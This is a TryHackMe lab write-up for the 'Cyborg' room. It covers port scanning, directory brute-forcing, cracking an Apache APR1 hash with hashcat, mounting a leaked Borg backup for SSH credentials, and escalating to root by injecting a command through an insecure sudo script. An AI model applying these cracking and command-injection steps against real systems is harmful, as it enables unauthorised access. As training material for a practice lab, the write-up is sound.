# Cyborg — TryHackMe Writeup

![6cc3e134a104210f90367c6557e42b6e](https://github.com/user-attachments/assets/1074ea89-5565-478c-901e-c06cedede8b5)

**Difficulty:** Easy  
**Access:** Free  
**Room Link:** https://tryhackme.com/room/cyborgt8  

A box involving encrypted archives, source code analysis, credential cracking, and privilege escalation via insecure scripting.

---

## Initial Recon — RustScan

Started with RustScan for fast port discovery.

<img width="1147" height="685" alt="rust_scan" src="https://github.com/user-attachments/assets/dad17999-440f-4351-a04f-532d9e1817ae" />

---

## Service Enumeration — Nmap

After identifying open ports, performed service enumeration.

<img width="775" height="328" alt="nmap_sca" src="https://github.com/user-attachments/assets/4a6c7983-0f5e-4dcc-a519-77ab2f100172" />

---

## Directory Discovery — Gobuster

Since port 80 was open, performed directory brute-forcing.

<img width="1043" height="292" alt="gobuster_result " src="https://github.com/user-attachments/assets/5fdcfd6a-91ad-490f-b188-99199b352dc8" />

---

## Admin Panel Discovery

While exploring the `/admin` page, found an interesting conversation in the shoutbox mentioning a backup named **music_archive**.

<img width="1917" height="841" alt="admin_sandbox" src="https://github.com/user-attachments/assets/a342db4f-d26b-42cf-9b86-477503d29820" />


There was also a **Download** button that downloaded:

```
archive.tar
```

---

## Extracting the Archive

now let's extract it and see what's inside it.

```
tar xvf archive.tar
```

<img width="463" height="343" alt="achieve-extraction" src="https://github.com/user-attachments/assets/bcf41bc0-b2ad-4284-b46f-34f3ba7d6bf9" />

---

## Credential Discovery

with further exploration found credentials inside:

```
/etc/squid/passwd
```

<img width="687" height="540" alt="etc_passwd" src="https://github.com/user-attachments/assets/4865bd29-8425-4360-9b33-cc41996e3a02" />

Content:

```
music_archive:$apr1$BpZ.Q.1m$F0<REDACTED>
```

### Hash Analysis

with some research i found that this is a Apache MD5 password hash (APR1):  

- `$apr1$` → Apache MD5 (APR1) format  
- `BpZ.Q.1m` → Salt  
- `F0<REDACTED>` → Hash  

---

## Cracking Apache MD5 Hash

APR1 corresponds to **hashcat mode 1600**.

```bash
hashcat -a 0 -m 1600 hash.txt rockyou.txt
```

<img width="662" height="535" alt="hash_password" src="https://github.com/user-attachments/assets/36118625-5809-47c2-aa0f-0cc9b3c8499f" />


Password successfully recovered.

---

## Borg Backup Repository Analysis

Now back to our finding archive file we can see some config and readme files:

Content of `config` file:

```
version = 1
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
id = ebb1973fa0114d4ff34180d<REDACTED>
key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGH<REDACTED>
```

Content of `README`:

```
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

---

## Installing Borg

To use Borg shown in readme file we need to install it first:

```bash
sudo apt install borgbackup
```

---

## Mounting the Backup
now follow the documentation we need to mount this backup file in our local machine 

https://borgbackup.readthedocs.io/en/stable/

Create extraction directory:

```bash
mkdir extract
```

Mount the repository:

```bash
borg mount home/field/dev/final_archive extract
```

<img width="688" height="418" alt="mounted " src="https://github.com/user-attachments/assets/9df4455d-144e-494c-9b63-8230f099552e" />

---

## SSH Credentials Found

While exploring the mounted directories, found `note.txt` inside `Documents` containing SSH credentials.

<img width="770" height="95" alt="ssh_Cred" src="https://github.com/user-attachments/assets/00bd18b8-579c-4479-9c4c-2e4a064640ae" />

---

## SSH Access

with these credentials we can connect to ssh with alex and get user flag:

```bash
ssh alex@<machine-ip>
```

Retrieve user flag:

```bash
cd /home/alex
cat user.txt
```

---

# Privilege Escalation

Let's start by checking user's sudo permissions:

```bash
sudo -l
```

<img width="1222" height="128" alt="suod -l" src="https://github.com/user-attachments/assets/c1a268a5-cf87-4f1d-9e98-f0bdaa99b4e5" />

Found that user **alex** can execute:

```
/etc/mp3backups/backup.sh
```

as root.

---

## Analyzing backup.sh

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

while getopts c: flag
do
    case "${flag}" in 
        c) command=${OPTARG};;
    esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

dest="/etc/mp3backups/"

hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

echo "Backing up $backup_files to $dest/$archive_file"

tar czf $dest/$archive_file $backup_files

echo "Backup finished"

cmd=$($command)
echo $cmd
```

it looks like a simple script to compress mp3 files in achieve 

---

## Vulnerability

but this part looks interesting :

The script accepts a `-c` argument:

```bash
while getopts c: flag
do
    case "${flag}" in
        c) command=${OPTARG};;
    esac
done
```

And later executes:

```bash
cmd=$($command)
echo $cmd
```

This results in **command injection**, executed as root.

---

## Exploiting the Script

Since the script runs as root, we can execute arbitrary commands.

Retrieve root flag:

```bash
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

<img width="1175" height="547" alt="root_flag" src="https://github.com/user-attachments/assets/0ac76df2-ddb4-42b7-95b1-c7e8081cb19f" />

Root flag obtained.

---

# Attack Chain Summary

1. RustScan → Open ports discovered  
2. Nmap → Service enumeration  
3. Gobuster → Admin panel found  
4. Downloaded Borg backup archive  
5. Extracted Apache MD5 hash  
6. Cracked hash using Hashcat (mode 1600)  
7. Mounted Borg repository  
8. Retrieved SSH credentials  
9. Logged in as alex  
10. Exploited insecure sudo script  
11. Achieved root via command injection  

---

## Key Learnings

- Borg backups can leak sensitive credentials if improperly secured  
- APR1 (Apache MD5) hashes can be cracked using Hashcat mode 1600  
- Always audit sudo scripts for argument injection  
- `getopts` misuse can lead to command execution vulnerabilities

---

## Author

**Akshay Sutariya**

- TryHackMe: https://tryhackme.com/p/mrAkki  
- LinkedIn: https://www.linkedin.com/in/akshay-sutariya2404/  

